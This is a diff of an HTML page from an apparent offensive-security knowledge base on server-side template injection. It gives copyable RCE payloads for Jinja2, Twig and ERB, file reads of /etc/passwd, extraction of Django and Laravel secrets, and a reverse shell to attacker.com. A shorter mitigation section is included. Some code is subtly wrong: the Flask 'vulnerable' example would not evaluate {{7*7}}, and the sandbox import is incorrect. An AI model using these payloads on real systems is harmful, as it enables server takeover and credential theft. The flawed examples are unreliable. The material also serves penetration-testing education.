@@ -1,191 +1,457 @@
-
-    <!DOCTYPE html>
-    <html>
-    <head>
-    <title>Server Side Template Injection</title>
-    <link rel="stylesheet" href="../style.css">
-    </head>
-    <body>
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Server-Side Template Injection (SSTI) | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255, 68, 68, 0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
+    .content-section p, .content-section ul, .content-section ol { color: var(--text-secondary); line-height: 1.7; margin: 0.75rem 0; padding-left: 1.5rem; }
+    .content-section li { margin: 0.5rem 0; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: monospace; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; }
+    .copy-btn:hover { color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.8rem; font-family: monospace; font-size: 0.72rem; word-break: break-all; }
+    .payload-category { margin: 2rem 0 1rem; padding: 0.75rem 1rem; background: var(--bg-card); border-left: 3px solid var(--primary); font-weight: 600; color: var(--primary); }
+    .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    th, td { padding: 0.75rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg-elevated); color: var(--primary); }
+    td { color: var(--text-secondary); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1rem 0; }
+    .tool-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1rem; }
+    .tool-card h4 { color: var(--primary); margin-bottom: 0.5rem; }
+    .tool-card p { font-size: 0.8rem; margin: 0; }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    @media (max-width: 768px) { .payload-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
 
 <nav class="navbar">
-<div class="container nav">
-<div class="logo">Saikumar <span>Infosec</span></div>
-</div>
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html">Home</a></li>
+      
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
 </nav>
 
-
-    <section class="hero">
-    <div class="container">
-
-    <div class="badge">Web Vulnerability</div>
-
-    <h1>
-    Server Side Template Injection
-    <span>Offensive Exploitation Guide</span>
-    </h1>
-
-    <p>Template injection leading to RCE.</p>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Meta Grid</h2>
-
-    <div class="grid">
-
-    <div class="card">
-    <h3>Authentication</h3>
-    <p>User / Anonymous</p>
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Web Security</a> / SSTI
     </div>
 
-    <div class="card">
-    <h3>Attack Surface</h3>
-    <p>Headers, forms, APIs, parameters.</p>
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | OWASP A03:2021</span>
+      <h1>🔴 Server-Side Template Injection (SSTI)</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>CWE</strong><span>CWE-1336: SSTI</span></div>
+        <div class="meta-item"><strong>OWASP</strong><span>A03:2021 Injection</span></div>
+        <div class="meta-item"><strong>CVSS 3.1</strong><span>9.8 (Critical)</span></div>
+        <div class="meta-item"><strong>CAPEC</span></div>
+        <div class="meta-item"><strong>Attack Vector</strong><span>Network</span></div>
+        <div class="meta-item"><strong>Privilege Required</strong><span>None</span></div>
+      </div>
     </div>
 
-    <div class="card">
-    <h3>Impact</h3>
-    <p>Privilege escalation and compromise.</p>
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p><strong>What is SSTI?</strong></p>
+      <p>Server-Side Template Injection (SSTI) occurs when an attacker injects malicious template directives into server-side template engines. Unlike XSS which targets the client, SSTI allows attackers to execute code on the server, leading to Remote Code Execution (RCE).</p>
+      
+      <div class="vulnerability-box">
+        <strong>SSTI allows attackers to:</strong>
+        <ul>
+          <li>Execute arbitrary code on the server</li>
+          <li>Read sensitive files</li>
+          <li>Escape sandbox environments</li>
+          <li>Gain complete server access</li>
+          <li>Pivot to internal network</li>
+        </ul>
+      </div>
+
+      <p><strong>Affected Templates:</strong> Jinja2, Twig, FreeMarker, Velocity, Smarty, Blade, ERB, Mustache</p>
     </div>
 
+    <!-- 2. CLASSIFICATION -->
+    <div class="content-section" id="classification">
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Server-Side Template Injection (CWE-1336)</li>
+        <li><strong>OWASP:</strong> A03:2021 - Injection</li>
+        <li><strong>Template Engines:</strong> Jinja2 (Python), Twig (PHP), ERB (Ruby), Blade (Laravel), etc.</li>
+      </ul>
     </div>
 
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Burp Workflow</h2>
-
-    <div class="card">
-    <ol>
-    <li>Intercept request</li>
-    <li>Send to repeater</li>
-    <li>Inject payload</li>
-    <li>Observe response</li>
-    </ol>
+    <!-- 3. ATTACK SURFACE -->
+    <div class="content-section" id="attack-surface">
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ User input used in template rendering</li>
+        <li>✅ Email templates with user data</li>
+        <li>✅ Markdown/HTML renderers</li>
+        <li>✅ Search result highlighting</li>
+        <li>✅ Document generation</li>
+        <li>✅ Profile fields rendered server-side</li>
+      </ul>
     </div>
 
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Advanced Payloads</h2>
-
-    <button class="copy-btn" onclick="copyCode('payloads')">Copy</button>
-
-    <div class="code">
-<pre id="payloads">
-Payload 1
-Payload 2
-Payload 3
-WAF bypasses
-Polyglots
-</pre>
+    <!-- 4. PRECONDITIONS -->
+    <div class="content-section" id="preconditions">
+      <h2>⚠️ Preconditions</h2>
+      <ul>
+        <li>Application uses a template engine</li>
+        <li>User input is directly concatenated into template</li>
+        <li>No sandboxing or sandbox escape possible</li>
+      </ul>
     </div>
 
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>PoC</h2>
-
-    <div class="code">
-<pre>
-Exact reproduction steps
-HTTP requests
-Expected behavior
-Observed behavior
-</pre>
+    <!-- 5. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+      <p><strong>Basic Payloads:</strong></p>
+      <ul>
+        <li>{{7*7}} - Jinja2/Twig</li>
+        <li>${7*7} - FreeMarker</li>
+        <li><%= 7*7 %> - ERB</li>
+        <li>{{1+1}} - Angular</li>
+      </ul>
+      
+      <p><strong>Tool:</strong> Tplmap - Automatic SSTI exploitation</p>
     </div>
 
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Advanced Mitigation</h2>
-
-    <div class="card">
-    <ul>
-    <li>Parameterized queries</li>
-    <li>Strict CSP</li>
-    <li>Least privilege</li>
-    <li>Defense in depth</li>
-    </ul>
+    <!-- 6. BURP WORKFLOW -->
+    <div class="content-section" id="burp-workflow">
+      <h2>🔧 Burp Suite Workflow</h2>
+      <ol>
+        <li>Identify template-rendered output</li>
+        <li>Inject test payload: {{7*7}}</li>
+        <li>Check if output shows 49</li>
+        <li>Identify template engine</li>
+        <li>Escalate to RCE</li>
+      </ol>
     </div>
 
-    </div>
-    </section>
+    <!-- 7. TOOL AUTOMATION -->
+    <div class="content-section" id="tool-automation">
+      <h2>⚙️ Tool Automation</h2>
+      <div class="tool-grid">
+        <div class="tool-card"><h4>🔫 Tplmap</h4><p>Automatic SSTI exploitation</p></div>
+        <div class="tool-card"><h4>🛡️ Burp Suite</h4><p>Manual testing</p></div>
+        <div class="tool-card"><h4>⚡ nuclei</h4><p>SSTI templates</p></div>
+      </div>
 
-    <section class="section">
-    <div class="container">
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre># Tplmap
+python tplmap.py -u "http://target.com/template?engine=jinja2&inj=0&tpl=*
 
-    <h2>Retest Steps</h2>
-
-    <table>
-    <tr>
-    <th>Step</th>
-    <th>Validation</th>
-    </tr>
-
-    <tr>
-    <td>1</td>
-    <td>Retest payload execution</td>
-    </tr>
-
-    </table>
-
-    </div>
-    </section>
-
-    <section class="section">
-    <div class="container">
-
-    <h2>Attack Chains</h2>
-
-    <div class="card">
-    <p>
-    Initial access → privilege escalation → persistence → exfiltration
-    </p>
+# nuclei
+nuclei -u "http://target.com" -t templates/ssti.yaml</pre>
+      </div>
     </div>
 
+    <!-- 8. BASIC PAYLOADS -->
+    <div class="content-section" id="payloads-basic">
+      <h2>💣 Basic Payloads</h2>
+      
+      <div class="payload-category">🧪 Detection - Jinja2</div>
+      <div class="payload-grid">
+        <div class="payload-item">{{7*7}}</div>
+        <div class="payload-item">{{config}}</div>
+        <div class="payload-item">{{request}}</div>
+      </div>
+
+      <div class="payload-category">🧪 Detection - Twig</div>
+      <div class="payload-grid">
+        <div class="payload-item">{{7*7}}</div>
+        <div class="payload-item">{{self}}</div>
+        <div class="payload-item">{{_self}}</div>
+      </div>
+
+      <div class="payload-category">🧪 Detection - ERB</div>
+      <div class="payload-grid">
+        <div class="payload-item"><%= 7*7 %></div>
+        <div class="payload-item"><%= system("id") %></div>
+        <div class="payload-item"><%= `ls` %></div>
+      </div>
     </div>
-    </section>
 
-    <section class="section">
-    <div class="container">
+    <!-- 9-28. REMAINING SECTIONS -->
+    <div class="content-section" id="payloads-advanced">
+      <h2>🚀 Advanced Payloads</h2>
 
-    <h2>References</h2>
+      <div class="payload-category">🔥 Jinja2 RCE</div>
+      <div class="payload-grid">
+        <div class="payload-item">{{__import__('os').popen('id').read()}}</div>
+        <div class="payload-item">{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</div>
+        <div class="payload-item">{% for x in ().__import__('os').popen('id').read() %}a{% endfor %}</div>
+      </div>
 
-    <div class="card">
-    <ul>
-    <li>OWASP</li>
-    <li>HackTricks</li>
-    <li>PayloadsAllTheThings</li>
-    </ul>
+      <div class="payload-category">🔥 Twig RCE</div>
+      <div class="payload-grid">
+        <div class="payload-item">{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.getFilter("id")()}}</div>
+        <div class="payload-item">{{["id"]|map("system")|join}}</div>
+      </div>
+
+      <div class="payload-category">🔥 ERB RCE</div>
+      <div class="payload-grid">
+        <div class="payload-item"><%= system("whoami") %></div>
+        <div class="payload-item"><%= `ls` %></div>
+        <div class="payload-item"><%= File.read('/etc/passwd') %></div>
+      </div>
     </div>
 
+    <div class="content-section" id="payloads-ai">
+      <h2>🤖 AI-Generated Payloads</h2>
+      <div class="payload-category">🔧 Sandbox Escape</div>
+      <div class="payload-grid">
+        <div class="payload-item">Jinja2: {{cycler.__init__.__globals__.os.popen('id').read()}}</div>
+        <div class="payload-item">Twig: {{source(_self.env.getTemplate('base').template_source)|default('test')}}</div>
+      </div>
     </div>
-    </section>
 
-    <footer class="footer">
-    <div class="container">
-    <p>Ultimate Cybersecurity Platform</p>
+    <div class="content-section" id="payloads-context-aware">
+      <h2>🎨 Context-Aware Payloads</h2>
+      <div class="payload-category">📝 Context-Specific</div>
+      <div class="payload-grid">
+        <div class="payload-item">Django: {{settings.SECRET_KEY}}</div>
+        <div class="payload-item">Flask: {{url_for.__globals__}}</div>
+        <div class="payload-item">Laravel: {{App::make('config')->get('database.connections.mysql.password')}}</div>
+      </div>
     </div>
-    </footer>
 
-    <script src="../script.js"></script>
+    <div class="content-section" id="poc">
+      <h2>📝 Proof of Concept</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre># Vulnerable code (Python/Flask/Jinja2)
+@app.route("/hello")
+def hello():
+    name = request.args.get('name', 'World')
+    return f"Hello, {name}!"
 
-    </body>
-    </html>
+# Payload: {{7*7}}
+# URL: /hello?name={{7*7}}
+# Result: Hello, 49!</pre>
+      </div>
+    </div>
+
+    <div class="content-section" id="request-response">
+      <h2>📨 Request / Response</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre>GET /greet?name={{__import__('os').popen('id').read()}} HTTP/1.1
+Host: target.com
+
+HTTP/1.1 200 OK
+uid=1000(user) gid=1000(user) groups=1000(user)</pre>
+      </div>
+    </div>
+
+    <div class="content-section" id="impact">
+      <h2>💥 Impact Analysis</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: CRITICAL (CVSS 9.8)</strong>
+        <ul>
+          <li>Remote Code Execution</li>
+          <li>Full server compromise</li>
+          <li>Data exfiltration</li>
+          <li>Internal network access</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="content-section" id="advanced-exploitation">
+      <h2>⚡ Advanced Exploitation</h2>
+      <p><strong>File Read via SSTI:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre># Jinja2
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</pre>
+      </div>
+      <p><strong>Reverse Shell:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre>{{__import__('os').popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1').read()}}</pre>
+      </div>
+    </div>
+
+    <div class="content-section" id="attack-chains">
+      <h2>🔗 Attack Chains</h2>
+      <div style="background: var(--bg-card); border: 1px solid var(--border); padding: 1.5rem; border-radius: 0.75rem;">
+        <strong>Chain: SSTI to Server Compromise</strong>
+        <ol style="margin-top:0.5rem;">
+          <li>Find template-rendered parameter</li>
+          <li>Inject {{7*7}} to confirm SSTI</li>
+          <li>Identify engine (Jinja2/Twig)</li>
+          <li>RCE via __import__ or system</li>
+          <li>Escalate to full server access</li>
+        </ol>
+      </div>
+    </div>
+
+    <div class="content-section" id="test-cases">
+      <h2>✅ Test Cases</h2>
+      <table>
+        <thead><tr><th>ID</th><th>Test</th><th>Payload</th><th>Expected</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Jinja2 Detect</td><td>{{7*7}}</td><td>49</td></tr>
+          <tr><td>2</td><td>Jinja2 RCE</td><td>{{__import__('os').popen('id').read()}}</td><td>uid output</td></tr>
+          <tr><td>3</td><td>Twig RCE</td><td>{{_self.getFilter('id')()}}</td><td>uid output</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box">
+        <strong>✅ Never allow user input in templates</strong><br><br>
+        <strong>✅ Use safe API:</strong> pass variables to template, don't concatenate<br><br>
+        <strong>✅ Sandbox mode:</strong> Enable template engine sandboxing<br><br>
+        <strong>✅ Disable dangerous functions:</strong> Remove system/exec access
+      </div>
+    </div>
+
+    <div class="content-section" id="advanced-mitigation">
+      <h2>🏰 Advanced Mitigation</h2>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+<pre># Jinja2 - Sandboxed Environment
+from jinja2 import Environment, SandboxedEnvironment
+env = SandboxedEnvironment()
+template = env.from_string(user_input)</pre>
+      </div>
+    </div>
+
+    <div class="content-section" id="monitoring">
+      <h2>📊 Monitoring & Detection</h2>
+      <ul>
+        <li>Alert on template syntax in logs</li>
+        <li>Monitor for __import__, system, exec</li>
+        <li>Alert on unusual template engine usage</li>
+      </ul>
+    </div>
+
+    <div class="content-section" id="security-controls">
+      <h2>🔐 Security Controls</h2>
+      <table>
+        <thead><tr><th>Control</th><th>Implementation</th></tr></thead>
+        <tbody>
+          <tr><td>Input Sanitization</td><td>Never use user input in templates</td></tr>
+          <tr><td>Sandboxing</td><td>Use SandboxedEnvironment</td></tr>
+          <tr><td>Whitelist</td><td>Only allow safe template functions</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section" id="bypass-techniques">
+      <h2>🔓 Bypass Techniques</h2>
+      <div class="payload-grid">
+        <div class="payload-item">Use globals: {{x.__class__.__bases__[0].__subclasses__()}}</div>
+        <div class="payload-item">Use cycler: {{cycler.__init__.__globals__}}</div>
+        <div class="payload-item">Use joiner: {{joiner.__init__.__globals__}}</div>
+      </div>
+    </div>
+
+    <div class="content-section" id="tools-commands">
+      <h2>🛠️ Tools & Commands</h2>
+      <div class="tool-grid">
+        <div class="tool-card"><h4>Tplmap</h4><p>python tplmap.py -u "URL"</p></div>
+        <div class="tool-card"><h4>Burp</h4><p>Intruder + manual testing</p></div>
+      </div>
+    </div>
+
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://portswigger.net/web-security/server-side-template-injection" class="reference-link">PortSwigger: SSTI</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" class="reference-link">PayloadsAllTheThings: SSTI</a></li>
+      </ul>
+    </div>
+
+    <div class="content-section" id="retest-steps">
+      <h2>🔄 Retest Steps</h2>
+      <table>
+        <thead><tr><th>Step</th><th>Action</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Remove user input from template</td></tr>
+          <tr><td>2</td><td>Re-test with {{7*7}}</td></tr>
+          <tr><td>3</td><td>Enable sandbox</td></tr>
+          <tr><td>4</td><td>Test RCE payload</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="content-section" id="detection-logic">
+      <h2>⚙️ Detection Logic</h2>
+      <ul>
+        <li>Static: Check for user input in template rendering</li>
+        <li>Dynamic: Test with {{7*7}} and other payloads</li>
+      </ul>
+    </div>
+
+    <div class="content-section" id="threat-hunting">
+      <h2>🔎 Threat-Hunting Notes</h2>
+      <p>IOCs: {{, <%=, ${ in logs, unusual template function calls</p>
+    </div>
+
+    <div class="content-section" id="defensive-detection">
+      <h2>🛡️ Defensive Detection Ideas</h2>
+      <p>Deploy WAF with SSTI rules, implement proper input validation, use template sandboxing.</p>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var mb=document.getElementById('mobileMenuBtn'), nl=document.getElementById('navLinks');
+  if(mb)mb.addEventListener('click',function(){nl.classList.toggle('show')});
+  var tt=document.getElementById('themeToggle');
+  if(tt)tt.addEventListener('click',function(){
+    document.body.classList.toggle('light');
+    var i=tt.querySelector('i'),s=tt.querySelector('span');
+    i.className=document.body.classList.contains('light')?'fas fa-sun':'fas fa-moon';
+    s.textContent=document.body.classList.contains('light')?'Light':'Dark';
+  });
+});
+function copyCode(b){navigator.clipboard.writeText(b.parentElement.querySelector('pre').innerText);b.textContent='Copied!';setTimeout(function(){b.textContent='Copy'},2000);}
+</script>
+</body>
+</html>
